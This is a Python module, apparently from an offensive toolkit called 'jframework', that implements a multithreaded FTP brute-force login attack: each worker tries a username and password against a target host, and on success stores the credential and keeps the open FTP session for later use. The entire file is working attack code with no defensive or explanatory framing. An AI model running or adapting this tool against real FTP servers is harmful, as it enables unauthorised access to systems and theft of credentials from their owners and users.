from jframework.modules.login._bruteforce import _Bruteforce
import ftplib
import sys


class Ftpbruteforce(_Bruteforce):

    def worker(self, user, password):

        ftp = ftplib.FTP()
        ftp.connect(self.HOST, timeout=7)
        try:
            ftp.login(user, password)
            self.print_result(user, password, error=False)
            self.lock.acquire()
            self.add_credential(user, password, "ftp")
            self.add_session(ftp, user, "ftp")
            self.lock.release()
        except Exception as e:
            print(e)

            if self.verb:
                self.print_result(user, password, error=True)

            ftp.close()

        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.HOST, timeout=7)
        except:
            print("{} Connection problem.".format(self.HOST))
            return None, None
        ftp.close()

        super(Ftpbruteforce, self).run()

        return self.sessions, self.credentials